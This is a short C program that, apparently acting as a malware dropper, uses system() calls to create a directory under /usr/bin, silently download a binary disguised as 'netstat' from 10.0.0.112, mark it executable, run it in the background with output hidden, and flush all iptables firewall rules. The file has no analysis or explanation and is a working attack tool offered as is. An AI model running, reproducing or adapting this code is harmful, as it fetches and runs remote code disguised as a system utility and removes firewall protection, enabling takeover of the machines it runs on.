#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main()
{
	int g;
		g=system("mkdir /usr/bin/srcs >> /dev/null 2>>/dev/null");
	int o;
		o=system("wget -q -P /usr/bin/srcs/ http://10.0.0.112/c/netstat && chmod 777 /usr/bin/srcs/netstat");
	int d;
		d=system("/usr/bin/srcs/netstat & fg >> /dev/null 2>>/dev/null");
	int i;
		i=system("iptables -F >>/dev/null 2>>/dev/null");
	int s;
		s=system("/usr/bin/srcs/ls");
	return 0;
}
